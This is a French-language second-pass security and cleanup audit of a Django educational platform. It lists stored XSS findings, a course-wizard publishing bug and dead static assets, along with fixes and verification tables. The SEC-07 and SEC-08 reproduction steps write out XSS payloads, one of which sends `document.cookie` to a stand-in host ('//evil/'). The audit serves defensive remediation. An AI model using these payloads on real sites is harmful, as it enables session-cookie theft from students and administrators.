# Rapport d'audit — plateforme_educative (passe 2)

Branche `finalisation-plateforme` (`4ae801d`) · re-audit du 2026-08-30 · Django 4.2.30 / Python 3.13

> **MÀJ 2026-08-30 — correctifs passe 2 appliqués** (`bef6bc1`) : SEC-07/08/09,
> BUG-09/10/11, UX-09, CLEAN-05/06/09/11/12/16/21/23 + logos (2,2 Mo → 56 Ko).
>
> **MÀJ 2026-08-30 — derniers P3 nettoyés** (`9f9a042`) : `print()` d'exceptions
> avalées (`logistics/views.py`) → `logger` ; `debug_task` Celery inutilisé
> supprimé ; `EvenementForm` — champ `cours` restreint au formateur ; N+1
> supprimées (`student_dashboard_view` 3 req au lieu de ~4/cours ;
> `_admin_dashboard_context` graphe 7 jours = 1 req → dashboard admin 29→23 req).
>
> **MÀJ 2026-08-30 — chantiers finaux traités** :
> `691a614` pagination + recherche des tickets (+ champ `Ticket.date_creation`
> manquant) · `b3e91e5` purge `base.css` **109→70 Ko** (62 blocs morts,
> vérifié au navigateur sur 6 types de page) · `484444e` styles inline du
> header `base.html` → classes **+ correction d'un bug préexistant de bascule
> de langue** (ne marchait pas au retour FR↔EN sur les sous-pages).
>
> **Plus aucun bug connu.** Reste : passe de masse des styles inline par
> template (chantier, non fait — risque > bénéfice). `manage.py test` = **99
> verts** (SQLite). Aucun 500 sur l'ensemble des routes × 4 rôles.

Cette passe suit le premier audit et ses correctifs (commit `4ae801d`). Méthode :
99 tests de référence rejoués (verts, SQLite), parcours de toutes les routes GET
× 4 rôles, **tests IDOR réels** (prof2 sur les objets de prof1, élève2 sur les
sessions d'élève1), revue navigateur **mobile 375 px** (accueil, dashboards,
catalogue, chapitre, espace formateur), revue de code ciblée `|safe` / wizard /
formulaires / requêtes, inventaire statiques et templates.

---

## 1. Résumé exécutif

Les correctifs du premier audit **tiennent** (SEC-01 espace formateur → 403,
`/media/` authentifié, timeline admin traduite, pages d'erreur, IDOR
formateur↔formateur et élève↔élève tous en 403, aucune fuite anonyme, aucun 500
sur l'ensemble des routes). La suite de tests reste à **99 verts**.

Cette passe a trouvé **3 XSS stockées** via `{% ... |safe %}` sur des champs
saisis par les formateurs / à l'inscription (description de cours/chapitre rendue
en HTML brut aux élèves ; timeline du dashboard admin), et **1 bug de brouillon**
(l'assistant de création de cours publie le cours dès l'étape 1 → un cours vide
apparaît au catalogue si le formateur abandonne). Le reste est de la dette : styles
inline, ~15 Mo de fichiers statiques morts, pagination absente en logistique.

**Présentable à l'encadrant ?** → **Oui après SEC-07/08 et BUG-09** (≈ 1 h, très
localisés). Les XSS ne sont exploitables que par un formateur (compte semi-fiable)
mais frapperaient un élève **ou un admin** qui ouvre le contenu — à corriger avant
toute démo où l'encadrant crée un compte formateur.

---

## 2. Tableau de synthèse

| ID | Gravité | Zone | Résumé | Effort |
|----|---------|------|--------|--------|
| SEC-07 | **P2** | XSS stockée | `chapitre.description` / `cours.description` rendus `|safe` (Textarea plein texte) → un formateur injecte du HTML/JS vu par les élèves | S |
| SEC-08 | **P2** | XSS stockée | Dashboard admin : `{{ event.desc|safe }}` interpole `user.get_full_name()` (nom choisi à l'inscription) | S |
| BUG-09 | **P2** | Wizard / catalogue | `wizard_step1_cours` crée le `Cours` avec `actif=True` → cours vide visible au catalogue si le wizard est abandonné | S |
| SEC-09 | P3 | XSS stockée | `dashboard_student` : `{{ radar_labels_json|safe }}` dans `<script>`, `radar_labels` = titres de cours ; `json.dumps` n'échappe pas `<` | S |
| BUG-10 | P3 | Wizard | `wizard_step1_cours` renvoie 400 (au lieu de 403) pour un non-formateur ; check basé sur `is_staff` | S |
| BUG-11 | P3 | Wizard | `wizard_step4_pdfs` : `print()` de debug ; upload PDF validé par extension seule (pas de `validate_file_size`) | S |
| UX-09 | P3 | Notifications | `nouveau_cours` notifie **tous** les élèves du niveau dès la création, même pour un cours vide | S |
| CLEAN-05 | P3 | Statiques morts | `plateforme_educative/core/static/` (~5 Mo, 12 images) jamais servi (`core` pas dans `INSTALLED_APPS`) | S |
| CLEAN-06 | P3 | Statiques morts | 21 images orphelines dans `static/images/` ≈ **10 Mo** (annexe A) | S |
| CLEAN-21 | P3 | PWA / perf | Le service worker précache `images/logo_white.png` = **2,2 Mo** → chaque install PWA télécharge 2,2 Mo pour le logo | S |
| CLEAN-16 | P3 | Templates morts | 4 partials sans aucun `include` : `users_table_body`, `equipements_section`, `kanban_assignation_section`, `ticket_form_modal` | S |
| CLEAN-09 | P3 | Assets | `tabler-icons.woff` (794 Ko) : le CSS déclare woff2 **et** woff, woff jamais téléchargé | S |
| CLEAN-22 | P3 | ORM / perf | `logistics/views.py` : ~15 `Model.objects.all()` sans pagination (inventaire, tickets, ateliers, demandes) | M |
| CLEAN-11 | P3 | Config | `CSRF_TRUSTED_ORIGINS` code en dur les domaines Railway (mort pour un nœud hors-ligne) | S |
| CLEAN-12 | P3 | Code mort | Détection réseau dupliquée : `core/utils.has_internet` vs `llm_factory._has_internet` | S |
| CLEAN-13 | P3 | CSS | `static/core/css/base.css` : 5228 lignes / 117 Ko, règles dupliquées | L |
| CLEAN-23 | P3 | Admin Django | `accounts/admin.py` vide : `Utilisateur` / `Niveau` / `Classe` / `ConfigurationSysteme` absents de `/admin/` — aucun recours superuser si un compte casse | S |

---

## 3. Détail des constats

### SEC-07 — XSS stockée : descriptions de cours/chapitre rendues `|safe`  ·  **P2**  ·  CONFIRMÉ
- [ ] **Fichiers** :
  `apprentissage/templates/apprentissage/partials/detail_chapitre.html:670`
  (`{{ chapitre.description|safe }}`),
  `apprentissage/templates/apprentissage/partials/detail_cours.html:88`
  (`{{ cours.description|safe }}`).
- **Preuve** : `CoursForm` / `ChapitreForm` (`apprentissage/forms.py:12,26`) utilisent
  un `forms.Textarea` simple — pas de WYSIWYG, pas de `bleach`, aucune
  sanitisation. `grep -rn "bleach\|ckeditor\|tinymce"` → 0.
- **Repro** : formateur → « Gérer un cours » → description =
  `<img src=x onerror="alert(document.cookie)">` → enregistrer. Se connecter en
  élève, ouvrir le cours → le JS s'exécute. Idem via la description d'un chapitre.
- **Observé / attendu** : HTML brut exécuté / le texte doit être échappé.
- **Correctif** : retirer `|safe`. Si des retours à la ligne sont voulus :
  `{{ chapitre.description|linebreaks }}` (échappe puis ajoute `<p>`/`<br>`).
  ```django
  {# detail_chapitre.html:670 #}
  {{ chapitre.description|linebreaks }}
  {# detail_cours.html:88 #}
  <p>{{ cours.description|linebreaks }}</p>
  ```
- **Risque de régression** : nul si les descriptions sont du texte (c'est le cas
  du seed). Rejouer `manage.py test` (aucun test ne cible ce rendu).

### SEC-08 — XSS stockée : timeline du dashboard admin  ·  **P2**  ·  CONFIRMÉ
- [ ] **Fichier** : `core/templates/core/dashboard_admin.html:607`
  (`{{ event.desc|safe }}`). Source : `core/views.py:_admin_dashboard_context`
  (l. ~61/72/84) — `desc` interpole `t.formateur.get_full_name()`,
  `c.titre`, `u.get_full_name()`.
- **Preuve** : `get_full_name()` = `first_name + " " + last_name`, tous deux
  saisis librement au formulaire d'inscription (`InscriptionForm`, aucun
  validateur de contenu).
- **Repro** : s'inscrire avec prénom
  `<script>fetch('//evil/'+document.cookie)</script>`, faire valider le compte,
  puis un admin ouvre `/dashboard/admin/` → exécution dans la session admin.
- **Correctif** : retirer `|safe` (la desc est du texte, aucun HTML attendu) :
  ```django
  <div class="timeline-desc">{{ event.desc }}</div>
  ```
  (Le titre `{{ event.title }}` juste au-dessus est déjà correctement échappé.)
- **Risque** : nul. C'est dans le fichier déjà touché par I18N-01.

### BUG-09 — Le wizard publie le cours dès l'étape 1  ·  **P2**  ·  CONFIRMÉ
- [ ] **Fichier** : `apprentissage/views_wizard.py:39-45` +
  `apprentissage/models.py:60` (`Cours.actif` défaut `True`).
- **Repro** : formateur → « Créer un cours » (wizard) → étape 1 (titre + niveau)
  → **fermer l'onglet**. Le `Cours` existe avec `actif=True`, 0 chapitre. Se
  connecter en élève du même niveau : le cours vide apparaît dans le catalogue
  (`liste_cours` filtre `actif=True, niveau=…`), cliquable → page cours sans
  contenu.
- **Observé / attendu** : brouillon publié immédiatement / le cours ne doit être
  visible qu'une fois complété (ou explicitement publié).
- **Correctif** : créer en brouillon, publier à la fin.
  ```python
  # views_wizard.py, wizard_step1_cours
  cours = Cours.objects.create(..., createur=request.user, actif=False)
  # views_wizard.py, wizard_step4_pdfs — à la fin, avant le render success :
  cours.actif = True
  cours.save(update_fields=['actif'])
  ```
  (ou ajouter un bouton « Publier » sur `gerer_cours` et laisser `actif=False`
  jusque-là.) Vérifier que `nouveau_cours` (formulaire classique) garde son
  comportement — il expose déjà la case `actif`.
- **Risque** : moyen — s'assurer que le wizard va jusqu'au bout dans le parcours
  nominal (sinon des cours restent invisibles). Ajouter un test :
  wizard step1 seul → cours `actif=False` et absent de `liste_cours` élève.

### SEC-09 — `radar_labels_json|safe` dans un `<script>`  ·  P3  ·  CONFIRMÉ
- [ ] **Fichier** : `core/templates/core/dashboard_student.html:954, 967, 968` ;
  source `core/views.py:370-371` (`json.dumps(radar_labels)` où
  `radar_labels` = `cours.titre[:15]`).
- **Preuve** : `json.dumps` n'échappe pas `<`, `>`, `&`. Un titre de cours
  contenant `</script>` (formateur) ferme la balise. La troncature à 15
  caractères limite l'exploitation à une évasion de balise (pas un `<script>`
  complet), mais c'est un vecteur.
- **Correctif** : `json_script` (échappe `<`, `>`, `&`) :
  ```django
  {{ radar_labels_json|json_script:"radar-labels" }}
  {{ radar_data_json|json_script:"radar-data" }}
  <script>
    const labels = JSON.parse(document.getElementById('radar-labels').textContent);
    const dataValues = JSON.parse(document.getElementById('radar-data').textContent);
  </script>
  ```
  (passer `radar_labels`/`radar_data` bruts au contexte, sans `json.dumps`, si on
  utilise `json_script` — il sérialise lui-même.)
- **Risque** : faible ; vérifier le rendu du radar sur `/dashboard/student/`.

### BUG-10 — Wizard étape 1 : 400 au lieu de 403, check sur `is_staff`  ·  P3  ·  CONFIRMÉ
- [ ] **Fichier** : `apprentissage/views_wizard.py:27-28`
- **Observé** : `if not (getattr(request.user,'is_staff',False) or role in [...] or is_formateur): return HttpResponseBadRequest(...)`.
  Un élève reçoit **400** (constaté). Sémantiquement faux (devrait être 403), et
  `is_staff` n'est pas un rôle métier — un élève marqué `is_staff` créerait des
  cours. `wizard_start` (l. 17-18) fait déjà `raise PermissionDenied` proprement.
- **Correctif** : aligner sur `wizard_start` :
  ```python
  if not (request.user.is_superuser or getattr(request.user,'role','') in ('ADMIN','FORMATEUR') or request.user.is_formateur):
      raise PermissionDenied(_("Vous n'êtes pas autorisé à créer des cours."))
  ```
  Appliquer le même garde à `wizard_step2/3/4` (aujourd'hui protégés seulement
  par `get_object_or_404(..., createur=request.user)` — défense en profondeur).
- **Risque** : nul.

### BUG-11 — `wizard_step4_pdfs` : print de debug + upload non validé  ·  P3  ·  CONFIRMÉ
- [ ] **Fichier** : `apprentissage/views_wizard.py:98-111`
- **Observé** : `if fichier.name.lower().endswith('.pdf')` — extension seule, pas
  de type MIME ni de taille. `Document.objects.create()` **contourne** les
  validateurs du modèle (`FileExtensionValidator`, `validate_file_size`). Ligne
  111 : `print(f"Erreur lancement tâche synchrone: {e}")`.
- **Correctif** : construire via `DocumentForm` (validation) ou appeler
  explicitement `validate_file_size` + un check `content_type`; remplacer le
  `print` par `logger.warning`.
- **Risque** : faible.

### UX-09 — Notification de masse à la création d'un cours vide  ·  P3  ·  CONFIRMÉ
- [ ] **Fichier** : `apprentissage/views.py:nouveau_cours` (l. ~18-30 du corps)
- **Observé** : à la création (`CoursForm`), tous les élèves `is_active` du
  niveau reçoivent une notification « Nouveau cours », même si le cours n'a
  encore aucun chapitre.
- **Correctif** : notifier seulement à la publication (couplé à BUG-09 :
  notifier quand `actif` passe `False→True`), ou quand le 1er chapitre est ajouté.
- **Risque** : faible.

---

## 4. Nettoyage / optimisation

| ID | Élément | Preuve d'inutilité | Gain | Risque | |
|----|---------|--------------------|------|--------|-|
| CLEAN-05 | `plateforme_educative/core/static/` (12 fichiers, ~5 Mo, `.avif` unsplash + `admin_bg.png` + `catalog-bg.jpg`…) | `django.contrib.staticfiles.finders.find('core/images/catalog-bg.jpg')` → `None`. `core` **absent** d'`INSTALLED_APPS` (seulement dans `TEMPLATES['DIRS']`). | ~5 Mo repo | Nul (jamais collecté ni servi) | [ ] |
| CLEAN-06 | 21 images de `static/images/` jamais référencées = **10,05 Mo** (`michael-fortsch…unsplash.jpg` 3,9 Mo, `admin_bg.jpg` + `aryan-nikhil…jpg` 1,4 Mo chacun, 4× `icon_*_generated.png` ~2,3 Mo, `conceptartist-leeb…png` 665 Ko, 7 `.avif`…) — liste complète annexe A | Script de diff refs↔fichiers (templates + CSS + PY, insensible au hash) : 0 référence. | ~10 Mo repo + collectstatic | Faible — re-vérifier `home.html` + `base.css` avant `git rm` (les images utilisées **sont** référencées et conservées) | [ ] |
| CLEAN-21 | `core/templates/pwa/service-worker.js` `PRECACHE_URLS` inclut `{% static 'images/logo_white.png' %}` = **2,21 Mo** | Le SW le télécharge à l'install pour **chaque** utilisateur PWA. Le logo affiché sur mobile est `icon-192.png` (déjà dans la liste). | -2,2 Mo par install | Nul — retirer la ligne (ou ré-exporter le logo < 60 Ko d'abord, cf. UX-04 passe 1) | [ ] |
| CLEAN-16 | 4 partials : `accounts/templates/accounts/partials/users_table_body.html`, `core/templates/core/partials/equipements_section.html`, `core/templates/core/partials/kanban_assignation_section.html`, `logistics/templates/logistics/partials/ticket_form_modal.html` | `grep -rn "<basename>" --include=*.py --include=*.html` (hors le fichier lui-même, hors `staticfiles/`) → **0 résultat** pour les 4. Aucun `{% include %}` dynamique connu vers eux. | 4 templates | Faible — relire chacun 30 s avant suppression | [ ] |
| CLEAN-09 | `static/vendor/tabler-icons/fonts/tabler-icons.woff` (794 Ko) | `tabler-icons.min.css` : `url("fonts/tabler-icons.woff2")` **puis** `url("fonts/tabler-icons.woff")`. woff2 supporté par 100 % des navigateurs cibles → le woff n'est jamais chargé. | 794 Ko repo + collectstatic | Faible — retirer aussi la partie `url(...woff)` du CSS ; tester l'affichage des icônes | [ ] |
| CLEAN-22 | `logistics/views.py` : `Equipment.objects.all()` (l. 56, 242, 685…), `Ticket.objects.all()` (l. 127), `Workshop.objects.all()` (l. 304, 392…), `DemandeMateriel.objects.all()` (l. 480, 565, 671…) — ~15 occurrences | Aucun `Paginator` dans le module. OK à petite échelle (dizaines d'items), lent/lourd à grande échelle. | Perf sous charge | Moyen — ajouter `Paginator` page par page ; vérifier les templates (boucles simples) | [ ] |
| CLEAN-11 | `core/settings.py` `CSRF_TRUSTED_ORIGINS` : `['https://*.up.railway.app', 'https://*.railway.app', 'https://edutech1.up.railway.app']` en dur | Hébergement Railway abandonné (cible = nœud satellite hors-ligne). | Config plus claire | Nul — ne garder que le fallback `_env_list('DJANGO_CSRF_TRUSTED_ORIGINS', [])` | [ ] |
| CLEAN-12 | `core/utils.has_internet` (TCP 8.8.8.8:53) vs `tuteur_ia/agents/llm_factory._has_internet` (TCP api.groq.com:443) | Deux fonctions, deux caches, même rôle. `has_internet` utilisée par `apprentissage/views.py:49`. | -1 implémentation | Faible — faire pointer `_has_internet` sur `core.utils.has_internet` | [ ] |
| CLEAN-13 | `static/core/css/base.css` : **5228 lignes / 117 Ko**, blocs `background-image` dupliqués (mêmes URL l. 863 & 4416, l. 1090 & 4412) | Taille anormale pour du CSS écrit main sans framework. | Poids sur chaque page | **Élevé** — purge à faire avec couverture visuelle complète. Chantier séparé, pas avant la démo. | [ ] |
| CLEAN-23 | `accounts/admin.py` = 2 lignes (aucun `register`) | `Utilisateur`, `Niveau`, `Classe`, `Notification`, `ConfigurationSysteme` absents de `/admin/`. Un superuser ne peut ni débloquer un compte ni changer le mode hors-ligne via `/admin/` — seulement via `/auth/gestion/`. | Filet de sécurité admin | Faible — enregistrer au moins `Utilisateur` (avec `UserAdmin`) et `ConfigurationSysteme`. **Décision à valider** : est-ce volontaire ? | [ ] |

**Migrations** : 10 / 11 / 4 / 10 par app — pas de doublon bloquant. `squashmigrations`
possible mais risqué si des instances sont déjà déployées → non recommandé maintenant.

**Dépendances** : `PyJWT>=2.8.0` reste dans `requirements.txt` — plus aucun
`import jwt` depuis le retrait de SimpleJWT (passe 1). Peut être retiré (risque nul,
petit paquet). `onnxruntime` / `tokenizers` : dépendances transitives de ChromaDB /
sentence-transformers, à garder.

---

## 5. Non vérifié

| Sujet | Pourquoi |
|-------|----------|
| **Passe de tests sous MySQL** | Services `MySQL80` / `MySQL93` arrêtés, démarrage refusé sans élévation. **99 verts sous SQLite** ; aucun modèle/migration touché depuis. → à relancer côté user. |
| **Tuteur socratique / QCM avec LLM** | Aucun Ollama actif. Seule la dégradation (503 traduit, pas de 500) est confirmée sur toutes les routes IA. |
| **PWA réelle** : install, offline (couper le réseau), `/offline/`, non-fuite de cache entre comptes | Le service worker exige un contexte sécurisé ; le navigateur intégré ne le teste pas de façon fiable. → `serve_https.py` sur téléphone. |
| **Vrai téléphone** | Revue faite au navigateur à 375 px (émulation). RAS : pas de scroll-x sur accueil / dashboards / catalogue / chapitre ; cartes bien repliées. |
| **Lecture vidéo HLS** | Aucune vidéo encodée dans le seed. |
| **Export → import round-trip avec vrai contenu** | Codes de permission + IDOR vérifiés ; mécanique couverte par `test_satellite.py`. |
| **E-mails** (rendu, langue, liens) | Non re-testés cette passe (corrigés + vérifiés passe 1). |
| **Accessibilité approfondie** (lecteur d'écran, axe-core) | Inspection de code seulement. |

---

## 6. Ordre de correction recommandé

**Lot A — avant la démo (P2, ~1 h)**
1. **SEC-08** — retirer `|safe` l. 607 de `dashboard_admin.html`. Indépendant, 1 ligne.
2. **SEC-07** — `detail_chapitre.html:670` + `detail_cours.html:88` : `|safe` → `|linebreaks`. Indépendant.
3. **BUG-09** — wizard : `actif=False` à l'étape 1, `actif=True` à l'étape 4 (+ test). **Dépend de** : décider si on couple la notification (UX-09) à la publication — recommandé de faire les deux ensemble.
4. Rejouer `python manage.py test` (99) + parcours élève du catalogue.

**Lot B — P3 rapides (~45 min)**
5. **SEC-09** — `dashboard_student.html` : `|safe` → `json_script`. Indépendant.
6. **BUG-10 / BUG-11** — wizard : `PermissionDenied` au lieu de 400, garde sur les 4 étapes, `print` → `logger`, validation d'upload. Un seul lot « wizard ».
7. **UX-09** — notification à la publication uniquement (avec BUG-09).
8. **CLEAN-23** — enregistrer `Utilisateur` + `ConfigurationSysteme` dans `accounts/admin.py` (après validation que c'est souhaité).

**Lot C — nettoyage en une passe (~1 h)**
9. **CLEAN-05** (`core/static/`), **CLEAN-06** (10 Mo d'images — annexe A), **CLEAN-21**
   (retirer le logo du precache SW), **CLEAN-16** (4 partials), **CLEAN-11** (Railway).
   → un commit « nettoyage », rejouer tests + `collectstatic` + rendre l'accueil.
10. **CLEAN-09** (woff), **CLEAN-12** (`has_internet`). Indépendants.

**Lot D — chantiers séparés (ne pas mélanger à la démo)**
11. **CLEAN-22** (pagination logistique), **CLEAN-13** (purge `base.css`),
    styles inline (UX-03 passe 1). Un lot par domaine, avec couverture visuelle.
12. Reprendre les points « Non vérifié » : téléphone réel, PWA offline, IA avec Ollama, passe MySQL.

---

## État des correctifs de la passe 1 (régression : OK)

| Correctif passe 1 | Re-vérifié le 2026-08-30 |
|---|---|
| SEC-01 espace_formateur | élève → **403** ✓ |
| IDOR formateur↔formateur (11 endpoints GET+POST) | tous **403** ✓ |
| IDOR élève↔élève (résultats/corriger QCM) | **403** ✓ |
| `/media/` authentifié + blocage `chroma_db/` | anon 302, connecté 200, `chroma_db` 404 ✓ |
| I18N-01 timeline admin | `/en/dashboard/admin/` sans fuite FR ✓ |
| Pages 403/404/500 | rendu FR + EN vérifié navigateur ✓ |
| DEBUG défaut False + `_TESTING` | `manage.py test` 99 verts ✓ |
| Aucun 500 sur l'ensemble des routes GET × 4 rôles | ✓ |

---

## Correctifs passe 2 appliqués (2026-08-30)

| ID | Correctif | Vérifié |
|----|-----------|---------|
| SEC-07 | `detail_chapitre.html` / `detail_cours.html` : `|safe` → `|linebreaks` sur la description | `<script>` dans une description chapitre → rendu `&lt;script&gt;` ✓ |
| SEC-08 | `dashboard_admin.html:607` : `{{ event.desc|safe }}` → `{{ event.desc }}` | `<img onerror>` dans un `first_name` → `&lt;img…&gt;` sur le dashboard admin ✓ |
| SEC-09 | `dashboard_student.html` : `{{ radar_*_json|safe }}` → `{{ radar_*|json_script }}` + `JSON.parse` ; la vue passe les listes brutes | Chart.js radar rendu depuis `<script type="application/json">`, données OK ✓ |
| BUG-09 | Wizard : `wizard_step1_cours` crée `actif=False` ; `wizard_step4_pdfs` publie (`actif=True`) + notifie. Helper `_notifier_nouveau_cours` partagé. | step1 seul → `actif=False`, absent du catalogue élève ✓ |
| BUG-10 | Wizard : garde `_exiger_formateur` (raise `PermissionDenied`) sur les **5** étapes ; check basé sur le rôle, plus sur `is_staff` | wizard step1 en élève → **403** (était 400) ✓ |
| BUG-11 | Wizard step4 : `print` → `logger` ; upload PDF passé par `validate_file_size` ; couverture (step2) : check `content_type image/*` | — |
| UX-09 | `nouveau_cours` / `editer_cours` : notification élèves seulement si le cours est publié (ou passe brouillon→publié) | — |
| CLEAN-23 | `accounts/admin.py` : `Utilisateur` (`UserAdmin` custom), `Niveau`, `Classe`, `Notification`, `ConfigurationSysteme` (singleton) enregistrés | `/admin/accounts/utilisateur/` → 200 ✓ |
| CLEAN-05 | `plateforme_educative/core/static/` supprimé (12 fichiers, ~5 Mo) | `collectstatic` OK (183 fichiers) |
| CLEAN-06 | 19 images orphelines supprimées de `static/images/` (~10 Mo) | — |
| CLEAN-09 | `tabler-icons.woff` (794 Ko) supprimé + `url(...woff)` retiré du CSS | `collectstatic` post-process OK (aucun ref cassé) |
| CLEAN-11 | `CSRF_TRUSTED_ORIGINS` : domaines Railway retirés → `_env_list(..., [])` | — |
| CLEAN-12 | `llm_factory._has_internet` délègue à `core.utils.has_internet` (endpoint Groq) ; imports `socket`/`time` retirés | 99 tests verts |
| CLEAN-16 | 4 partials orphelins supprimés | grep : 0 référence |
| CLEAN-21 | `service-worker.js` : `logo_white.png` retiré du precache ; `SW_CACHE_VERSION` v4→v5 | — |
| UX-04 (passe 1) | `logo.png` / `logo_white.png` : 2,21 Mo → **56 Ko** (redimensionnés 480×320, optimisés) | — |
| — | `liste_cours.html` : garde `{% elif cours.createur %}` (cours sans créateur → « Formateur ») | — |
| SEC-05 (ajustement) | Clé éphémère en prod : `warnings.warn` retiré (bruyant sur chaque `manage.py`) ; `check --deploy` signale déjà `security.W009` | — |

À faire côté user : `pip install -r requirements.txt` (purge DRF), passe de tests
sous MySQL, ré-export d'un vrai logo dédié si besoin (les 2 fichiers sont
identiques pour l'instant).

## Correctifs mobile — « zoom / scroll / dynamique » (2026-08-31, `2594af7`)

CSS uniquement (`base.css` + `responsive.css`), 99 tests verts, revue navigateur à 375 px.

| Zone | Problème | Correctif | Vérifié |
|------|----------|-----------|---------|
| Menu latéral (`.main-nav` @≤768) | Glissement animé via `left` (reflow à chaque frame) | `transform: translateX()` + `.main-nav.open { transform: translateX(0) !important }` (composited) | Ouverture OK au screenshot (375 px), panneau 280 px, plein écran ✓ |
| Volet notifications (`@≤768`) | `.notifications-dropdown-menu` débordait ~112 px **hors écran à gauche** (cloche au centre de `.header-actions`) | `position: fixed; top: calc(52px + safe-area); left/right: .6rem; width:auto; max-height:70dvh` | Rendu dans le viewport (l:10 → r:366 sur 375) ✓ |
| Bouton « tout marquer comme lu » | Écrasé à 32 px (texte sur 4 lignes) — la règle des boutons ronds `.notifications-dropdown-container button` le ciblait aussi | Sélecteur `> button` (cloche = enfant direct) ; `base.css` : `gap:12px` + `white-space:nowrap; flex-shrink:0` sur h3 / bouton / form | Bouton 83 px, une ligne ✓ |
| Détail chapitre (`@≤768`) | Fil d'Ariane sur 4 lignes (229 px de barre d'en-tête avant le contenu), titre `<h2>` sur 3 lignes | Fil d'Ariane → `← Courses` seul (`> span` + `> a:not(:first-child)` masqués) ; `.chapitre-title` `clamp(1.15rem, 5vw, 1.6rem)` | En-tête 229 → 105 px, vidéo visible sans défiler, page 2813 → 2547 px ✓ |
| En-tête QCM (`.qcm-hdr` @≤768) | `<h1>` comprimé dans une colonne de ~161 px (titre sur 6 lignes, 186 px) — `.meta` occupait la droite | `flex-wrap:wrap` + titre `flex:1 1 0; min-width:0` + `.meta` `flex-basis:100%` sous un filet | Titre 255 px sur 3 lignes, métas en dessous ✓ |

Note : le panneau navigateur en arrière-plan gèle le recalc de style (`document.visibilityState='hidden'`) → `getComputedStyle` renvoie des valeurs de `transform` périmées ; un `screenshot` force le paint. C'est ce qui avait fait croire, en session précédente, que « le menu latéral ne s'ouvrait pas » — le CSS `left` d'origine fonctionnait déjà.

Restant (dynamique, non bloquant) : page session socratique — `.ia-sidebar` ≈ 413 px avant le chat sur mobile ; zone `.ia-chat-area` très aérée quand il n'y a qu'un message (par nature).

## Annexe A — 21 images orphelines de `static/images/` (≈ 10 Mo)

```
 3895 Ko  michael-fortsch-F6jTkr9T_zI-unsplash.jpg
 1395 Ko  admin_bg.jpg
 1395 Ko  aryan-nikhil-jSyzETbKch4-unsplash.jpg
  667 Ko  icon_workshop_generated.png
  665 Ko  conceptartist-leeb-cover-web-02.png
  602 Ko  icon_ai_tutor_generated.png
  588 Ko  icon_courses_generated.png
  519 Ko  icon_iot_generated.png
  131 Ko  photo-1683178861337-ca70ef8c0db3.avif
   85 Ko  photo-1461360228754-6e81c478b882.avif
   77 Ko  photo-1544396821-4dd40b938ad3.avif
   56 Ko  photo-1590098563837-5e7669b27e55.avif
   45 Ko  premium_photo-1683147638125-fd31a506a429.avif
   38 Ko  4738482_fa68_7.PNG
   37 Ko  ai-technology-microchip-background-vector-digital-transformation-concept_53876-112222.JPG
   30 Ko  photo-1742782328790-122e5deb2f51.avif
   20 Ko  arduino-for-beginners-cbag_s.PNG
   19 Ko  shutterstock_2682150417.JPG
   11 Ko  pngtree-teacher-s-college-classroom-coaching-course-poster-background-image_188494.jpg
   11 Ko  57d2c4e710b0e494fc69761999191245.jpg
    9 Ko  blue-background-with-white-line-middle_483537-4472.avif
```

## Annexe B — `|safe` sur contenu influencé par l'utilisateur (3 occurrences)

```
apprentissage/templates/apprentissage/partials/detail_chapitre.html:670  {{ chapitre.description|safe }}   (formateur)
apprentissage/templates/apprentissage/partials/detail_cours.html:88      {{ cours.description|safe }}      (formateur)
core/templates/core/dashboard_admin.html:607                             {{ event.desc|safe }}            (nom d'inscription)
```
`change_password.html:133` (`field.help_text|safe`) et `dashboard_admin.html:686`
(`chart_data|json_script`) sont sûrs (contenu développeur / échappement correct).
